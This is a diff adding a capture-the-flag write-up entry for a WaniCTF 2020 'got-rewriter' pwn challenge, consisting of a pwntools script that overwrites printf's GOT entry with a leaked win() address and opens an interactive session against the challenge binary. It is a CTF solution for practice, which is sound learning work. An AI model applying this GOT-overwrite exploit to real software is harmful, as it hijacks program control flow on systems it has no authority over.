@@ -134,3 +134,26 @@ io.recvuntil(b"FLAG{")
 log.success("FLAG{%s", io.recvuntil(b"}"))
 io.close()
 ```
+
+# 04-got-rewriter
+
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/04-got-rewriter
+
+```python
+#!/usr/bin/env python3
+from pwn import ELF, args, context, log, process, remote
+# context.log_level = "debug"
+exe = context.binary = ELF("./pwn04", checksec=False)
+if args.REMOTE:
+    io = remote("::1", 9004)
+else:
+    io = process(exe.path)
+io.recvuntil(b"win = 0x")
+win_addr = int(io.recvline(drop=True), 16)
+log.info("win():\t0x%016x", win_addr)
+printf_got = exe.got.printf
+log.info("printf@got:\t0x%016x", printf_got)
+io.sendlineafter(b"0x6010b0): ", hex(printf_got).encode())
+io.sendlineafter(b"rewrite value: ", hex(win_addr).encode())
+io.interactive()
+```
